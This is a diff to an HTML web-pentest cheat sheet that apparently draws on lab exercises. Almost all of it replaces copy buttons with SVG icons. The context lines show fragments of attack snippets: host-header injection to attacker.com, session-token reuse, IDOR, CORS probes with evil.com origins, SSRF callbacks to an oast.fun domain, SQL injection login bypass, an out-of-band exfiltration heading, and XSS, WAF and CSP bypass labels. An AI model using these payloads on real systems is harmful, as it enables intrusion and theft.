+                  </button>
                 </div>
                 <pre>
 gowitness file -f live_subs.txt --threads 5 -P screenshots/
@@ -2164,7 +2951,32 @@ eyewitness --web -f live_subs.txt --threads 5 -d screenshots/</pre
               <div class="cb">
                 <div class="cbh">
                   <span class="cl">burp headers</span
-                  ><button class="cpb">⎘ Copy</button>
+                  ><button class="cpb sbanimated-btn">
+                    <svg
+                      class="btn-icon copy-icon"
+                      style="--icon-color: var(--accent, #4b5563)"
+                      viewBox="0 0 24 24"
+                      fill="none"
+                      stroke="currentColor"
+                      stroke-width="2"
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                    >
+                      <rect
+                        class="copy-back"
+                        x="9"
+                        y="9"
+                        width="13"
+                        height="13"
+                        rx="2"
+                        ry="2"
+                      />
+                      <path
+                        class="copy-front"
+                        d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
+                      />
+                    </svg>
+                  </button>
                 </div>
                 <pre>
 X-Forwarded-Host: attacker.com
@@ -2212,7 +3024,32 @@ X-Forwarded-Server: attacker.com</pre
               <div class="cb">
                 <div class="cbh">
                   <span class="cl">bash</span
-                  ><button class="cpb">⎘ Copy</button>
+                  ><button class="cpb sbanimated-btn">
+                    <svg
+                      class="btn-icon copy-icon"
+                      style="--icon-color: var(--accent, #4b5563)"
+                      viewBox="0 0 24 24"
+                      fill="none"
+                      stroke="currentColor"
+                      stroke-width="2"
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                    >
+                      <rect
+                        class="copy-back"
+                        x="9"
+                        y="9"
+                        width="13"
+                        height="13"
+                        rx="2"
+                        ry="2"
+                      />
+                      <path
+                        class="copy-front"
+                        d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
+                      />
+                    </svg>
+                  </button>
                 </div>
                 <pre>
 # After logout, try reusing the captured session token
@@ -2311,7 +3148,32 @@ curl -H "Cookie: session=CAPTURED_TOKEN" \
               <div class="cb">
                 <div class="cbh">
                   <span class="cl">bash</span
-                  ><button class="cpb">⎘ Copy</button>
+                  ><button class="cpb sbanimated-btn">
+                    <svg
+                      class="btn-icon copy-icon"
+                      style="--icon-color: var(--accent, #4b5563)"
+                      viewBox="0 0 24 24"
+                      fill="none"
+                      stroke="currentColor"
+                      stroke-width="2"
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                    >
+                      <rect
+                        class="copy-back"
+                        x="9"
+                        y="9"
+                        width="13"
+                        height="13"
+                        rx="2"
+                        ry="2"
+                      />
+                      <path
+                        class="copy-front"
+                        d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
+                      />
+                    </svg>
+                  </button>
                 </div>
                 <pre>
 # URL parameter IDOR
@@ -2340,7 +3202,32 @@ done</pre
               <div class="cb">
                 <div class="cbh">
                   <span class="cl">bash</span
-                  ><button class="cpb">⎘ Copy</button>
+                  ><button class="cpb sbanimated-btn">
+                    <svg
+                      class="btn-icon copy-icon"
+                      style="--icon-color: var(--accent, #4b5563)"
+                      viewBox="0 0 24 24"
+                      fill="none"
+                      stroke="currentColor"
+                      stroke-width="2"
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                    >
+                      <rect
+                        class="copy-back"
+                        x="9"
+                        y="9"
+                        width="13"
+                        height="13"
+                        rx="2"
+                        ry="2"
+                      />
+                      <path
+                        class="copy-front"
+                        d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
+                      />
+                    </svg>
+                  </button>
                 </div>
                 <pre>
 # Original: GET /api/profile?user_id=YOUR_ID
@@ -2493,7 +3380,32 @@ curl "https://TARGET/api/profile?user_id=VICTIM_ID&amp;user_id=YOUR_ID"</pre
               <div class="cb">
                 <div class="cbh">
                   <span class="cl">payloads</span
-                  ><button class="cpb">⎘ Copy</button>
+                  ><button class="cpb sbanimated-btn">
+                    <svg
+                      class="btn-icon copy-icon"
+                      style="--icon-color: var(--accent, #4b5563)"
+                      viewBox="0 0 24 24"
+                      fill="none"
+                      stroke="currentColor"
+                      stroke-width="2"
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                    >
+                      <rect
+                        class="copy-back"
+                        x="9"
+                        y="9"
+                        width="13"
+                        height="13"
+                        rx="2"
+                        ry="2"
+                      />
+                      <path
+                        class="copy-front"
+                        d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
+                      />
+                    </svg>
+                  </button>
                 </div>
                 <pre>
 # Step 1: Probe (confirm HTML injection, harmless)
@@ -2526,7 +3438,32 @@ curl "https://TARGET/api/profile?user_id=VICTIM_ID&amp;user_id=YOUR_ID"</pre
               <div class="cb">
                 <div class="cbh">
                   <span class="cl">bash</span
-                  ><button class="cpb">⎘ Copy</button>
+                  ><button class="cpb sbanimated-btn">
+                    <svg
+                      class="btn-icon copy-icon"
+                      style="--icon-color: var(--accent, #4b5563)"
+                      viewBox="0 0 24 24"
+                      fill="none"
+                      stroke="currentColor"
+                      stroke-width="2"
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                    >
+                      <rect
+                        class="copy-back"
+                        x="9"
+                        y="9"
+                        width="13"
+                        height="13"
+                        rx="2"
+                        ry="2"
+                      />
+                      <path
+                        class="copy-front"
+                        d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
+                      />
+                    </svg>
+                  </button>
                 </div>
                 <pre>
 # Find dangerous sinks in JS files
@@ -2573,7 +3510,32 @@ dalfox file candidates_xss.txt --silence</pre
               <div class="cb">
                 <div class="cbh">
                   <span class="cl">bash</span
-                  ><button class="cpb">⎘ Copy</button>
+                  ><button class="cpb sbanimated-btn">
+                    <svg
+                      class="btn-icon copy-icon"
+                      style="--icon-color: var(--accent, #4b5563)"
+                      viewBox="0 0 24 24"
+                      fill="none"
+                      stroke="currentColor"
+                      stroke-width="2"
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                    >
+                      <rect
+                        class="copy-back"
+                        x="9"
+                        y="9"
+                        width="13"
+                        height="13"
+                        rx="2"
+                        ry="2"
+                      />
+                      <path
+                        class="copy-front"
+                        d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
+                      />
+                    </svg>
+                  </button>
                 </div>
                 <pre>
 katana -u live_subs.txt -jc -kf all -d 5 \
@@ -2608,7 +3570,32 @@ done | tee secrets_found.txt</pre
               <div class="cb">
                 <div class="cbh">
                   <span class="cl">bash</span
-                  ><button class="cpb">⎘ Copy</button>
+                  ><button class="cpb sbanimated-btn">
+                    <svg
+                      class="btn-icon copy-icon"
+                      style="--icon-color: var(--accent, #4b5563)"
+                      viewBox="0 0 24 24"
+                      fill="none"
+                      stroke="currentColor"
+                      stroke-width="2"
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                    >
+                      <rect
+                        class="copy-back"
+                        x="9"
+                        y="9"
+                        width="13"
+                        height="13"
+                        rx="2"
+                        ry="2"
+                      />
+                      <path
+                        class="copy-front"
+                        d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
+                      />
+                    </svg>
+                  </button>
                 </div>
                 <pre>
 cat endpoints.txt | grep -E \
@@ -2632,7 +3619,32 @@ echo "[*] High-value files: $(wc -l &lt; high_value_files.txt)"
               <div class="cb">
                 <div class="cbh">
                   <span class="cl">bash</span
-                  ><button class="cpb">⎘ Copy</button>
+                  ><button class="cpb sbanimated-btn">
+                    <svg
+                      class="btn-icon copy-icon"
+                      style="--icon-color: var(--accent, #4b5563)"
+                      viewBox="0 0 24 24"
+                      fill="none"
+                      stroke="currentColor"
+                      stroke-width="2"
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                    >
+                      <rect
+                        class="copy-back"
+                        x="9"
+                        y="9"
+                        width="13"
+                        height="13"
+                        rx="2"
+                        ry="2"
+                      />
+                      <path
+                        class="copy-front"
+                        d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
+                      />
+                    </svg>
+                  </button>
                 </div>
                 <pre>
 cat all_js_files.txt | while read url; do
@@ -2670,7 +3682,32 @@ done | tee js_manual_review.txt</pre
               <div class="cb">
                 <div class="cbh">
                   <span class="cl">bash</span
-                  ><button class="cpb">⎘ Copy</button>
+                  ><button class="cpb sbanimated-btn">
+                    <svg
+                      class="btn-icon copy-icon"
+                      style="--icon-color: var(--accent, #4b5563)"
+                      viewBox="0 0 24 24"
+                      fill="none"
+                      stroke="currentColor"
+                      stroke-width="2"
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                    >
+                      <rect
+                        class="copy-back"
+                        x="9"
+                        y="9"
+                        width="13"
+                        height="13"
+                        rx="2"
+                        ry="2"
+                      />
+                      <path
+                        class="copy-front"
+                        d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
+                      />
+                    </svg>
+                  </button>
                 </div>
                 <pre>
 waybackurls TARGET | grep "=" | sort -u &gt; wayback_params.txt
@@ -2693,7 +3730,32 @@ arjun -i live_subs.txt -m GET,POST -t 10 -o arjun_params.txt</pre
               <div class="cb">
                 <div class="cbh">
                   <span class="cl">bash</span
-                  ><button class="cpb">⎘ Copy</button>
+                  ><button class="cpb sbanimated-btn">
+                    <svg
+                      class="btn-icon copy-icon"
+                      style="--icon-color: var(--accent, #4b5563)"
+                      viewBox="0 0 24 24"
+                      fill="none"
+                      stroke="currentColor"
+                      stroke-width="2"
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                    >
+                      <rect
+                        class="copy-back"
+                        x="9"
+                        y="9"
+                        width="13"
+                        height="13"
+                        rx="2"
+                        ry="2"
+                      />
+                      <path
+                        class="copy-front"
+                        d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
+                      />
+                    </svg>
+                  </button>
                 </div>
                 <pre>
 gf xss      all_params.txt | tee candidates_xss.txt
@@ -2776,7 +3838,32 @@ echo "[*] Redirect: $(wc -l &lt; candidates_redirect.txt)"</pre
               <div class="cb">
                 <div class="cbh">
                   <span class="cl">python — Turbo Intruder</span
-                  ><button class="cpb">⎘ Copy</button>
+                  ><button class="cpb sbanimated-btn">
+                    <svg
+                      class="btn-icon copy-icon"
+                      style="--icon-color: var(--accent, #4b5563)"
+                      viewBox="0 0 24 24"
+                      fill="none"
+                      stroke="currentColor"
+                      stroke-width="2"
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                    >
+                      <rect
+                        class="copy-back"
+                        x="9"
+                        y="9"
+                        width="13"
+                        height="13"
+                        rx="2"
+                        ry="2"
+                      />
+                      <path
+                        class="copy-front"
+                        d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
+                      />
+                    </svg>
+                  </button>
                 </div>
                 <pre>
 def queueRequests(target, wordlists):
@@ -2805,7 +3892,32 @@ def handleResponse(req, interesting):
               <div class="cb">
                 <div class="cbh">
                   <span class="cl">bash</span
-                  ><button class="cpb">⎘ Copy</button>
+                  ><button class="cpb sbanimated-btn">
+                    <svg
+                      class="btn-icon copy-icon"
+                      style="--icon-color: var(--accent, #4b5563)"
+                      viewBox="0 0 24 24"
+                      fill="none"
+                      stroke="currentColor"
+                      stroke-width="2"
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                    >
+                      <rect
+                        class="copy-back"
+                        x="9"
+                        y="9"
+                        width="13"
+                        height="13"
+                        rx="2"
+                        ry="2"
+                      />
+                      <path
+                        class="copy-front"
+                        d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
+                      />
+                    </svg>
+                  </button>
                 </div>
                 <pre>
 for origin in "https://evil.com" "null" "https://TARGET.evil.com"; do
@@ -2838,7 +3950,32 @@ done
               <div class="cb">
                 <div class="cbh">
                   <span class="cl">bash — install and run</span
-                  ><button class="cpb">⎘ Copy</button>
+                  ><button class="cpb sbanimated-btn">
+                    <svg
+                      class="btn-icon copy-icon"
+                      style="--icon-color: var(--accent, #4b5563)"
+                      viewBox="0 0 24 24"
+                      fill="none"
+                      stroke="currentColor"
+                      stroke-width="2"
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                    >
+                      <rect
+                        class="copy-back"
+                        x="9"
+                        y="9"
+                        width="13"
+                        height="13"
+                        rx="2"
+                        ry="2"
+                      />
+                      <path
+                        class="copy-front"
+                        d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
+                      />
+                    </svg>
+                  </button>
                 </div>
                 <pre>
 # Install
@@ -2860,7 +3997,32 @@ interactsh-client
                 <div class="cbh">
                   <span class="cl"
                     >payloads — replace YOUR-ID with interactsh domain</span
-                  ><button class="cpb">⎘ Copy</button>
+                  ><button class="cpb sbanimated-btn">
+                    <svg
+                      class="btn-icon copy-icon"
+                      style="--icon-color: var(--accent, #4b5563)"
+                      viewBox="0 0 24 24"
+                      fill="none"
+                      stroke="currentColor"
+                      stroke-width="2"
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                    >
+                      <rect
+                        class="copy-back"
+                        x="9"
+                        y="9"
+                        width="13"
+                        height="13"
+                        rx="2"
+                        ry="2"
+                      />
+                      <path
+                        class="copy-front"
+                        d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
+                      />
+                    </svg>
+                  </button>
                 </div>
                 <pre>
 # Blind SSRF
@@ -2937,7 +4099,32 @@ attacker+ssrf@YOUR-ID.oast.fun    (some mail servers do DNS lookup)</pre
               <div class="cb">
                 <div class="cbh">
                   <span class="cl">bash</span
-                  ><button class="cpb">⎘ Copy</button>
+                  ><button class="cpb sbanimated-btn">
+                    <svg
+                      class="btn-icon copy-icon"
+                      style="--icon-color: var(--accent, #4b5563)"
+                      viewBox="0 0 24 24"
+                      fill="none"
+                      stroke="currentColor"
+                      stroke-width="2"
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                    >
+                      <rect
+                        class="copy-back"
+                        x="9"
+                        y="9"
+                        width="13"
+                        height="13"
+                        rx="2"
+                        ry="2"
+                      />
+                      <path
+                        class="copy-front"
+                        d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
+                      />
+                    </svg>
+                  </button>
                 </div>
                 <pre>
 PATH="/admin"
@@ -3032,7 +4219,32 @@ curl -i -H "X-Rewrite-URL: ${PATH}" "https://TARGET/"</pre
               <div class="cb">
                 <div class="cbh">
                   <span class="cl">bash</span
-                  ><button class="cpb">⎘ Copy</button>
+                  ><button class="cpb sbanimated-btn">
+                    <svg
+                      class="btn-icon copy-icon"
+                      style="--icon-color: var(--accent, #4b5563)"
+                      viewBox="0 0 24 24"
+                      fill="none"
+                      stroke="currentColor"
+                      stroke-width="2"
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                    >
+                      <rect
+                        class="copy-back"
+                        x="9"
+                        y="9"
+                        width="13"
+                        height="13"
+                        rx="2"
+                        ry="2"
+                      />
+                      <path
+                        class="copy-front"
+                        d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
+                      />
+                    </svg>
+                  </button>
                 </div>
                 <pre>
 # Standard directory fuzzing
@@ -3066,7 +4278,32 @@ ffuf -u "https://TARGET/api/FUZZ" \
               <div class="cb">
                 <div class="cbh">
                   <span class="cl">bash</span
-                  ><button class="cpb">⎘ Copy</button>
+                  ><button class="cpb sbanimated-btn">
+                    <svg
+                      class="btn-icon copy-icon"
+                      style="--icon-color: var(--accent, #4b5563)"
+                      viewBox="0 0 24 24"
+                      fill="none"
+                      stroke="currentColor"
+                      stroke-width="2"
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                    >
+                      <rect
+                        class="copy-back"
+                        x="9"
+                        y="9"
+                        width="13"
+                        height="13"
+                        rx="2"
+                        ry="2"
+                      />
+                      <path
+                        class="copy-front"
+                        d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
+                      />
+                    </svg>
+                  </button>
                 </div>
                 <pre>
 cat candidates_redirect.txt \
@@ -3112,7 +4349,32 @@ cat candidates_redirect.txt \
               <div class="cb">
                 <div class="cbh">
                   <span class="cl">bash</span
-                  ><button class="cpb">⎘ Copy</button>
+                  ><button class="cpb sbanimated-btn">
+                    <svg
+                      class="btn-icon copy-icon"
+                      style="--icon-color: var(--accent, #4b5563)"
+                      viewBox="0 0 24 24"
+                      fill="none"
+                      stroke="currentColor"
+                      stroke-width="2"
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                    >
+                      <rect
+                        class="copy-back"
+                        x="9"
+                        y="9"
+                        width="13"
+                        height="13"
+                        rx="2"
+                        ry="2"
+                      />
+                      <path
+                        class="copy-front"
+                        d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
+                      />
+                    </svg>
+                  </button>
                 </div>
                 <pre>
 nuclei -l live_subs.txt \
@@ -3167,7 +4429,32 @@ python3 corsy.py -i live_subs.txt -t 10 \
               <div class="cb">
                 <div class="cbh">
                   <span class="cl">payloads</span
-                  ><button class="cpb">⎘ Copy</button>
+                  ><button class="cpb sbanimated-btn">
+                    <svg
+                      class="btn-icon copy-icon"
+                      style="--icon-color: var(--accent, #4b5563)"
+                      viewBox="0 0 24 24"
+                      fill="none"
+                      stroke="currentColor"
+                      stroke-width="2"
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                    >
+                      <rect
+                        class="copy-back"
+                        x="9"
+                        y="9"
+                        width="13"
+                        height="13"
+                        rx="2"
+                        ry="2"
+                      />
+                      <path
+                        class="copy-front"
+                        d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
+                      />
+                    </svg>
+                  </button>
                 </div>
                 <pre>
 '
@@ -3200,7 +4487,32 @@ python3 corsy.py -i live_subs.txt -t 10 \
               <div class="cb">
                 <div class="cbh">
                   <span class="cl">bash</span
-                  ><button class="cpb">⎘ Copy</button>
+                  ><button class="cpb sbanimated-btn">
+                    <svg
+                      class="btn-icon copy-icon"
+                      style="--icon-color: var(--accent, #4b5563)"
+                      viewBox="0 0 24 24"
+                      fill="none"
+                      stroke="currentColor"
+                      stroke-width="2"
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                    >
+                      <rect
+                        class="copy-back"
+                        x="9"
+                        y="9"
+                        width="13"
+                        height="13"
+                        rx="2"
+                        ry="2"
+                      />
+                      <path
+                        class="copy-front"
+                        d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
+                      />
+                    </svg>
+                  </button>
                 </div>
                 <pre>
 sqlmap -u "https://TARGET/page.php?id=1" \
@@ -3235,7 +4547,32 @@ sqlmap -u "https://TARGET/page.php?id=1" \
               <div class="cb">
                 <div class="cbh">
                   <span class="cl">template</span
-                  ><button class="cpb">⎘ Copy</button>
+                  ><button class="cpb sbanimated-btn">
+                    <svg
+                      class="btn-icon copy-icon"
+                      style="--icon-color: var(--accent, #4b5563)"
+                      viewBox="0 0 24 24"
+                      fill="none"
+                      stroke="currentColor"
+                      stroke-width="2"
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                    >
+                      <rect
+                        class="copy-back"
+                        x="9"
+                        y="9"
+                        width="13"
+                        height="13"
+                        rx="2"
+                        ry="2"
+                      />
+                      <path
+                        class="copy-front"
+                        d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
+                      />
+                    </svg>
+                  </button>
                 </div>
                 <pre>
 ## Title:
@@ -3404,7 +4741,32 @@ Which users are affected? What data is exposed?
               <div class="cb">
                 <div class="cbh">
                   <span class="cl">WHERE clause + login bypass</span
-                  ><button class="cpb">⎘ Copy</button>
+                  ><button class="cpb sbanimated-btn">
+                    <svg
+                      class="btn-icon copy-icon"
+                      style="--icon-color: var(--accent, #4b5563)"
+                      viewBox="0 0 24 24"
+                      fill="none"
+                      stroke="currentColor"
+                      stroke-width="2"
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                    >
+                      <rect
+                        class="copy-back"
+                        x="9"
+                        y="9"
+                        width="13"
+                        height="13"
+                        rx="2"
+                        ry="2"
+                      />
+                      <path
+                        class="copy-front"
+                        d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
+                      />
+                    </svg>
+                  </button>
                 </div>
                 <pre>
 # WHERE clause hidden data retrieval
@@ -3428,7 +4790,32 @@ admin'/*
                 <div class="cbh">
                   <span class="cl"
                     >UNION attacks — column count + data extraction</span
-                  ><button class="cpb">⎘ Copy</button>
+                  ><button class="cpb sbanimated-btn">
+                    <svg
+                      class="btn-icon copy-icon"
+                      style="--icon-color: var(--accent, #4b5563)"
+                      viewBox="0 0 24 24"
+                      fill="none"
+                      stroke="currentColor"
+                      stroke-width="2"
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                    >
+                      <rect
+                        class="copy-back"
+                        x="9"
+                        y="9"
+                        width="13"
+                        height="13"
+                        rx="2"
+                        ry="2"
+                      />
+                      <path
+                        class="copy-front"
+                        d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
+                      />
+                    </svg>
+                  </button>
                 </div>
                 <pre>
 # Step 1: Find column count (increment until error)
@@ -3462,7 +4849,32 @@ admin'/*
               <div class="cb">
                 <div class="cbh">
                   <span class="cl">blind SQLi — conditional + time-based</span
-                  ><button class="cpb">⎘ Copy</button>
+                  ><button class="cpb sbanimated-btn">
+                    <svg
+                      class="btn-icon copy-icon"
+                      style="--icon-color: var(--accent, #4b5563)"
+                      viewBox="0 0 24 24"
+                      fill="none"
+                      stroke="currentColor"
+                      stroke-width="2"
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                    >
+                      <rect
+                        class="copy-back"
+                        x="9"
+                        y="9"
+                        width="13"
+                        height="13"
+                        rx="2"
+                        ry="2"
+                      />
+                      <path
+                        class="copy-front"
+                        d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
+                      />
+                    </svg>
+                  </button>
                 </div>
                 <pre>
 # Conditional response (from lab: Blind SQL injection with conditional responses)
@@ -3490,7 +4902,32 @@ admin'/*
               <div class="cb">
                 <div class="cbh">
                   <span class="cl">out-of-band + Oracle OOB exfil</span
-                  ><button class="cpb">⎘ Copy</button>
+                  ><button class="cpb sbanimated-btn">
+                    <svg
+                      class="btn-icon copy-icon"
+                      style="--icon-color: var(--accent, #4b5563)"
+                      viewBox="0 0 24 24"
+                      fill="none"
+                      stroke="currentColor"
+                      stroke-width="2"
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                    >
+                      <rect
+                        class="copy-back"
+                        x="9"
+                        y="9"
+                        width="13"
+                        height="13"
+                        rx="2"
+                        ry="2"
+                      />
+                      <path
+                        class="copy-front"
+                        d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
+                      />
+                    </svg>
+                  </button>
                 </div>
                 <pre>
 # Oracle OOB (from lab: Blind SQLi with out-of-band data exfiltration)
@@ -3574,7 +5011,32 @@ admin'/*
               <div class="cb">
                 <div class="cbh">
                   <span class="cl">context-specific payloads</span
-                  ><button class="cpb">⎘ Copy</button>
+                  ><button class="cpb sbanimated-btn">
+                    <svg
+                      class="btn-icon copy-icon"
+                      style="--icon-color: var(--accent, #4b5563)"
+                      viewBox="0 0 24 24"
+                      fill="none"
+                      stroke="currentColor"
+                      stroke-width="2"
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                    >
+                      <rect
+                        class="copy-back"
+                        x="9"
+                        y="9"
+                        width="13"
+                        height="13"
+                        rx="2"
+                        ry="2"
+                      />
+                      <path
+                        class="copy-front"
+                        d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
+                      />
+                    </svg>
+                  </button>
                 </div>
                 <pre>
 # HTML body (innerHTML sink)
@@ -3614,7 +5076,32 @@ javascript:alert(1)
               <div class="cb">
                 <div class="cbh">
                   <span class="cl">WAF bypass + blocked tags</span
-                  ><button class="cpb">⎘ Copy</button>
+                  ><button class="cpb sbanimated-btn">
+                    <svg
+                      class="btn-icon copy-icon"
+                      style="--icon-color: var(--accent, #4b5563)"
+                      viewBox="0 0 24 24"
+                      fill="none"
+                      stroke="currentColor"
+                      stroke-width="2"
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                    >
+                      <rect
+                        class="copy-back"
+                        x="9"
+                        y="9"
+                        width="13"
+                        height="13"
+                        rx="2"
+                        ry="2"
+                      />
+                      <path
+                        class="copy-front"
+                        d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
+                      />
+                    </svg>
+                  </button>
                 </div>
                 <pre>
 # All standard tags blocked — use custom tags (lab solution)
@@ -3644,7 +5131,32 @@ javascript:alert(1)
               <div class="cb">
                 <div class="cbh">
                   <span class="cl">DOM XSS sinks</span
-                  ><button class="cpb">⎘ Copy</button>
+                  ><button class="cpb sbanimated-btn">
+                    <svg
+                      class="btn-icon copy-icon"
+                      style="--icon-color: var(--accent, #4b5563)"
+                      viewBox="0 0 24 24"
+                      fill="none"
+                      stroke="currentColor"
+                      stroke-width="2"
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                    >
+                      <rect
+                        class="copy-back"
+                        x="9"
+                        y="9"
+                        width="13"
+                        height="13"
+                        rx="2"
+                        ry="2"
+                      />
+                      <path
+                        class="copy-front"
+                        d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
+                      />
+                    </svg>
+                  </button>
                 </div>
                 <pre>
 # document.write with location.search (lab solution)
@@ -3685,7 +5197,32 @@ javascript:alert(1)
               <div class="cb">
                 <div class="cbh">
                   <span class="cl">CSP bypass + advanced</span
-                  ><button class="cpb">⎘ Copy</button>
+                  ><button class="cpb sbanimated-btn">
+                    <svg
+                      class="btn-icon copy-icon"
+                      style="--icon-color: var(--accent, #4b5563)"
+                      viewBox="0 0 24 24"
+                      fill="none"
+                      stroke="currentColor"
+                      stroke-width="2"
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                    >
+                      <rect
+                        class="copy-back"
+                        x="9"
+                        y="9"
+                        width="13"
+                        height="13"
+                        rx="2"
+                        ry="2"
+                      />
+                      <path
+                        class="copy-front"
+                        d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
+                      />
+                    </svg>
+                  </button>
                 </div>
                 <pre>
 # CSP bypass via JSONP on whitelisted domain
@@ -3791,7 +5328,32 @@ function handleResponse(){
               <div class="cb">
                 <div class="cbh">
                   <span class="cl">all bypass techniques from labs</span
-                  ><button class="cpb">⎘ Copy</button>
+                  ><button class="cpb sbanimated-btn">
+                    <svg
+                      class="btn-icon copy-icon"
+                      style="--icon-color: var(--accent, #4b5563)"
+                      viewBox="0 0 24 24"
+                      fill="none"
+                      stroke="currentColor"
+                      stroke-width="2"
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                    >
+                      <rect
+                        class="copy-back"
+                        x="9"
+                        y="9"
+                        width="13"
+                        height="13"
+                        rx="2"
+                        ry="2"
+                      />
+                      <path
+                        class="copy-front"
+                        d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
+                      />
+                    </svg>
+                  </button>
                 </div>
                 <pre>
 # Lab 1: No defenses — basic PoC
@@ -3901,7 +5463,32 @@ GET /change?_method=POST&amp;email=attacker@evil.com
               <div class="cb">
                 <div class="cbh">
                   <span class="cl">all 5 lab PoC templates</span
-                  ><button class="cpb">⎘ Copy</button>
+                  ><button class="cpb sbanimated-btn">
+                    <svg
+                      class="btn-icon copy-icon"
+                      style="--icon-color: var(--accent, #4b5563)"
+                      viewBox="0 0 24 24"
+                      fill="none"
+                      stroke="currentColor"
+                      stroke-width="2"
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                    >
+                      <rect
+                        class="copy-back"
+                        x="9"
+                        y="9"
+                        width="13"
+                        height="13"
+                        rx="2"
+                        ry="2"
+                      />
+                      <path
+                        class="copy-front"
+                        d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
+                      />
+                    </svg>
+                  </button>
                 </div>
                 <pre>
 # Quick check: is it frameable?
@@ -3958,7 +5545,32 @@ curl -I https://TARGET/ | grep -i "x-frame\|frame-ancestors"
               <div class="cb">
                 <div class="cbh">
                   <span class="cl">all lab solutions</span
-                  ><button class="cpb">⎘ Copy</button>
+                  ><button class="cpb sbanimated-btn">
+                    <svg
+                      class="btn-icon copy-icon"
+                      style="--icon-color: var(--accent, #4b5563)"
+                      viewBox="0 0 24 24"
+                      fill="none"
+                      stroke="currentColor"
+                      stroke-width="2"
+                      stroke-linecap="round"
+                      stroke-linejoin="round"
+                    >
+                      <rect
+                        class="copy-back"
+                        x="9"
+                        y="9"
+                        width="13"
+                        height="13"
+                        rx="2"
+                        ry="2"
